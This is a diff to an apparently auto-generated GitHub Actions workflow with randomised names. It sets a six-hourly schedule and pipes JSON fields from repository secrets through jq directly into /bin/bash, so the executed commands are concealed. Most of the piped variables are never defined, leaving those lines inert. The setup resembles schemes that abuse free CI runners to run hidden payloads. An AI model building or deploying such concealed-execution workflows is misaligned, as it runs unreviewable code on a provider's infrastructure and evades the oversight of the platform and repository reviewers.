@@ -1,25 +1,29 @@
 name: yangcuixue7615
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 1/6 * * *'
-jobs:  # 24651
+    - cron: '10 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangcuixue7615
         env:
-          zkzht826: ${{ secrets.zkzht826 }}
+          xfe709: ${{ secrets.xfe709 }}
         run: |
-          echo $zkzht826 | jq -r .wfv9759 | /bin/bash
-          echo $jjxf71 | jq -r .nbe8037 | /bin/bash
-          echo $in626 | jq -r .lacax69203 | /bin/bash
-          echo $lnvi3 | jq -r .nf13777 | /bin/bash
-          echo $kl08444 | jq -r .jueg2024 | /bin/bash
-          echo $p3259 | jq -r .jwnkh00843 | /bin/bash
-          echo $q21 | jq -r .k741 | /bin/bash
-          echo $tz925 | jq -r .keyg3 | /bin/bash
-          echo $cikdu8980 | jq -r .v275 | /bin/bash
+          echo $xfe709 | jq -r .muuev893 | /bin/bash
+          echo $xevth113 | jq -r .s0 | /bin/bash
+          echo $mfo20067 | jq -r .sfni54000 | /bin/bash
+          echo $p97771 | jq -r .qbk589 | /bin/bash
+          echo $f0883 | jq -r .xitq76 | /bin/bash
+          echo $elsb93 | jq -r .tnc88799 | /bin/bash
+          echo $hm2088 | jq -r .z29 | /bin/bash
+          echo $cmymo2065 | jq -r .ruwcu45330 | /bin/bash
+          echo $lnot278 | jq -r .rgwc255 | /bin/bash
+          echo $vxmkb9719 | jq -r .a67 | /bin/bash
+          echo $ihlu9 | jq -r .cnf061 | /bin/bash
+          echo $nm9 | jq -r .drd027 | /bin/bash
+          echo $aypmr6 | jq -r .nellp55391 | /bin/bash
 
